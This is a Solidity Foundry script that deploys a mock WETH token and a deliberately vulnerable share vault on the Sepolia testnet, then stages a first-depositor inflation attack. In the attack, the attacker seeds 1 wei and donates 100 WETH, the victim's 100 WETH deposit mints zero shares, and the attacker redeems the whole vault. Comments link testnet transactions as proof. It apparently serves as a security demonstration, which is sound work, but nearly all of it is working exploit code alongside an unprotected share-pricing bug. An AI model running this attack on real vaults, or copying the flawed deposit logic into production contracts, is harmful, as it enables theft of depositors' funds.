// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

// -- Proven on Sepolia (public Etherscan) via a Chainstack node -------------------------------
//   vault    0xd2a07bea74183b166972329918e8527bdf202784
//   1 DONATE  https://sepolia.etherscan.io/tx/0x8ef0955fec4bd75c25031a2b4e63f34d4634776c4da4b56999bcf6f29144bb75
//   2 VICTIM  https://sepolia.etherscan.io/tx/0x8644b19f788e6a7b4b722d048ff5bc1e2b9eeb315d9fbfac569c4ebc5910e41b  (100 WETH -> 0 shares)
//   3 REDEEM  https://sepolia.etherscan.io/tx/0x0ec926c6107867adfe80977cb9c91100e795329320c7438ecbffb38358875a7e  (1 share -> 200 WETH = drained)
// --------------------------------------------------------------------------------------------


/// Minimal WETH (emits Transfer so Etherscan shows the token flows).
contract MockWETH {
    string public name = "Mock WETH"; string public symbol = "mWETH"; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    event Transfer(address indexed from, address indexed to, uint256 value);
    function mint(address to, uint256 a) external { balanceOf[to] += a; emit Transfer(address(0), to, a); }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; emit Transfer(msg.sender, to, a); return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) { balanceOf[f] -= a; balanceOf[t] += a; emit Transfer(f, t, a); return true; }
}

/// The VULNERABLE share vault (events added so the 0-shares theft is visible on Etherscan).
contract VaultBuggy {
    MockWETH public weth;
    uint256 public totalShares;
    mapping(address => uint256) public shares;
    event Deposit(address indexed who, uint256 assets, uint256 sharesMinted);
    event Redeem(address indexed who, uint256 sharesBurned, uint256 assetsOut);
    constructor(address w) { weth = MockWETH(w); }
    function totalAssets() public view returns (uint256) { return weth.balanceOf(address(this)); }
    function deposit(uint256 assets) external returns (uint256 s) {
        s = totalShares == 0 ? assets : assets * totalShares / totalAssets();
        weth.transferFrom(msg.sender, address(this), assets);
        totalShares += s; shares[msg.sender] += s;
        emit Deposit(msg.sender, assets, s);
    }
    function redeem(uint256 s) external returns (uint256 assets) {
        assets = s * totalAssets() / totalShares;
        totalShares -= s; shares[msg.sender] -= s;
        weth.transfer(msg.sender, assets);
        emit Redeem(msg.sender, s, assets);
    }
}

/// Deploy the vault, then run the first-depositor inflation attack as real txs:
///   1) attacker deposit(1 wei)   2) attacker DONATE 100 WETH   3) victim deposit(100 WETH) -> 0 shares
///   4) attacker redeem(1) -> the whole vault. Attacker & victim are distinct addresses.
contract InflationSepolia is Script {
    function run() external {
        uint256 pk = vm.envUint("PK");
        address attacker = vm.addr(pk);
        uint256 vpk = uint256(keccak256("defi15-victim-v1"));
        address victim = vm.addr(vpk);
        vm.deal(attacker, 1 ether);

        // SINGLE broadcaster (attacker/deployer) — deploy + seed + donate. No mid-script key switch.
        // The victim's deposit and the attacker's redeem are sent afterwards via `cast send`.
        vm.startBroadcast(pk);
        MockWETH weth = new MockWETH();
        VaultBuggy vault = new VaultBuggy(address(weth));
        weth.mint(attacker, 100 ether + 1);
        weth.mint(victim, 100 ether);
        payable(victim).transfer(0.05 ether);          // gas for the victim's own tx (sent via cast later)
        vault.deposit(1);                               // TX: attacker seeds 1 wei -> 1 share
        weth.transfer(address(vault), 100 ether);       // TX: attacker DONATES 100 WETH (price spike)
        vm.stopBroadcast();

        console2.log("weth  ", address(weth));
        console2.log("vault ", address(vault));
        console2.log("attacker", attacker);
        console2.log("victim  ", victim);
        console2.log("victimKey %x", vpk);
    }
}
